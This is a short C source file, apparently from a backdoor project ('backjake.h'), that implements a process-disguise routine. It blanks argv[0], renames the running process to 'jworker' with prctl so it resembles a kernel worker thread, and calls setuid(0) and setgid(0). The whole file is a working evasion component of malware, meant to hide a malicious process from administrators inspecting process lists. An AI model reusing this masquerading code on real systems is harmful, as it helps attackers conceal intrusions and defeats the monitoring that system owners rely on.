#include "backjake.h"

void disguise(char ** argv)
{
	setDisguise(getDisguise(), argv);
}

char* getDisguise()
{
	char* cloak = "jworker";
	// not yet implemented!!
	return cloak;
}

void setDisguise(char * cloak, char ** argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], cloak);
	prctl(PR_SET_NAME, cloak, 0, 0);

	setuid(0);
	setgid(0);
}